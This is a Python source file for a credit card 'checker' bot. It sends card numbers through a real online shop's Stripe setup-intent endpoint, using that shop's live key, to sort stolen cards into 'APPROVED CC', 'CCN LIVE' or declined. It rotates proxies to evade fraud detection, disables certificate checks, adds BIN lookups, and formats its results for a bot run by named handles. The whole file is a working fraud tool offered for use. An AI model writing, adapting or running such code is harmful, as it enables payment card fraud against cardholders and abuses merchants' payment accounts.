import requests
import json
import time
import re
import random
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
CCN_WRONG_KEYWORDS = [
    "incorrect_cvc", "cvc_check: fail", "invalid_cvc", "cvv_decline",
    "declined_cvv", "wrong_cvc", "cvc_failure", "cvv_check: incorrect",
    "Your card's security code is incorrect.", "The CVC code is incorrect.",
    "CVC mismatch", "security code incorrect", "card live - cvv wrong",
    "live ccn", "cvc does not match"
]

CVV_LIVE_KEYWORDS = [
    "succeeded", "payment_method.attached", "payment_method.created",
    "setup_intent.succeeded", "payment_method_saved", "card_verified",
    "card_tokenized", "verified_card", "cvv_passed", "cvc_check: pass",
    "card_live", "live cvv", "Your payment method was saved",
    "Card successfully added", "Card has been verified",
    "Payment method added successfully", "SetupIntent status: succeeded",
    "Payment method saved"
]

def get_random_proxy():
    """Get a random proxy from proxy.txt file"""
    try:
        with open('proxy.txt', 'r') as f:
            proxies = f.readlines()
            proxy = random.choice(proxies).strip()

            # Parse proxy string (format: host:port:username:password)
            parts = proxy.split(':')
            if len(parts) == 4:
                host, port, username, password = parts
                proxy_dict = {
                    'http': f'http://{username}:{password}@{host}:{port}',
                    'https': f'http://{username}:{password}@{host}:{port}'
                }
                return proxy_dict
            return None
    except Exception as e:
        print(f"Error reading proxy file: {str(e)}")
        return None

def get_bin_info(bin_number):
    try:
        response = requests.get(f'https://api.voidex.dev/api/bin?bin={bin_number}', timeout=10)
        if response.status_code == 200:
            data = response.json()

            # Check if we have valid data
            if not data or 'brand' not in data:
                return {
                    'brand': 'UNKNOWN',
                    'type': 'UNKNOWN',
                    'level': 'UNKNOWN',
                    'bank': 'UNKNOWN',
                    'country': 'UNKNOWN',
                    'emoji': '🏳️'
                }

            # Return data mapped from Voidex API response
            return {
                'brand': data.get('brand', 'UNKNOWN'),
                'type': data.get('type', 'UNKNOWN'),
                'level': data.get('brand', 'UNKNOWN'),  # Using brand as level fallback
                'bank': data.get('bank', 'UNKNOWN'),
                'country': data.get('country_name', 'UNKNOWN'),
                'emoji': data.get('country_flag', '🏳️')
            }

        return {
            'brand': 'UNKNOWN',
            'type': 'UNKNOWN',
            'level': 'UNKNOWN',
            'bank': 'UNKNOWN',
            'country': 'UNKNOWN',
            'emoji': '🏳️'
        }
    except Exception as e:
        print(f"BIN lookup error: {str(e)}")
        return {
            'brand': 'UNKNOWN',
            'type': 'UNKNOWN',
            'level': 'UNKNOWN',
            'bank': 'UNKNOWN',
            'country': 'UNKNOWN',
            'emoji': '🏳️'
        }

def classify_response(res):
    raw_text = json.dumps(res).lower()
    
    if res.get("status") == "succeeded":
        return "APPROVED CC", "succeeded", True
    
    for keyword in CVV_LIVE_KEYWORDS:
        if keyword.lower() in raw_text:
            return "APPROVED CC", res.get("status", "unknown"), True
            
    for keyword in CCN_WRONG_KEYWORDS:
        if keyword.lower() in raw_text:
            return "CCN LIVE", res.get("error", {}).get("decline_code", ""), True
    
    return "DECLINED CC", res.get("error", {}).get("message", ""), False

def check_card_stripe(cc_line):
    """Check a single card using Stripe gateway"""
    start_time = time.time()
    
    try:
        n, mm, yy, cvc = cc_line.strip().split('|')
        if not yy.startswith('20'):
            yy = '20' + yy
            
        # Get proxy
        proxy = get_random_proxy()
        
        # Get setup intent
        setup = requests.post(
            "https://shopzone.nz/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent",
            data={"payment_method": "stripe_cc"},
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                "Accept": "application/json",
                "Content-Type": "application/x-www-form-urlencoded"
            },
            proxies=proxy,
            timeout=30,
            verify=False
        )
        
        if setup.status_code != 200:
            return f"❌ Setup failed. Status: {setup.status_code}"
            
        setup_data = setup.json()
        client_secret = setup_data.get("client_secret", "")
        if not client_secret:
            return "❌ Failed to get client secret"
            
        secret_parts = client_secret.split("_secret_")
        if len(secret_parts) < 2:
            return "❌ Invalid client secret format"
            
        secret = secret_parts[0]

        # Confirm the setup intent with card details
        confirm = requests.post(
            f"https://api.stripe.com/v1/setup_intents/{secret}/confirm",
            data={
                "payment_method_data[type]": "card",
                "payment_method_data[card][number]": n,
                "payment_method_data[card][cvc]": cvc,
                "payment_method_data[card][exp_month]": mm,
                "payment_method_data[card][exp_year]": yy,
                "payment_method_data[billing_details][address][postal_code]": "10080",
                "use_stripe_sdk": "true",
                "key": "pk_live_51LPHnuAPNhSDWD7S7BcyuFczoPvly21Beb58T0NLyxZctbTMscpsqkAMCAUVd37qe4jAXCWSKCGqZOLO88lMAYBD00VBQbfSTm",
                "client_secret": client_secret
            },
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded"
            },
            proxies=proxy,
            timeout=30,
            verify=False
        )
        
        elapsed_time = time.time() - start_time
        
        if confirm.status_code != 200:
            return f"❌ Confirmation failed. Status: {confirm.status_code}"
            
        response_data = confirm.json()
        status, reason, approved = classify_response(response_data)
        bin_info = get_bin_info(n[:6])
        
        # Format the response similar to your p.py format
        response_text = f"""
{status} {'❌' if not approved else '✅'}

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {reason}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        return response_text

    except Exception as e:
        elapsed_time = time.time() - start_time
        return f"❌ Error: {str(e)}"

def check_cards_stripe(cards_list):
    """Check multiple cards using Stripe gateway"""
    results = []
    for card in cards_list:
        result = check_card_stripe(card)
        results.append(result)
        time.sleep(1)  # Small delay between requests
    return results

# For standalone testing
if __name__ == "__main__":
    # Test with a single card
    test_card = "4556737586899855|12|2026|123"
    result = check_card_stripe(test_card)
    print(result)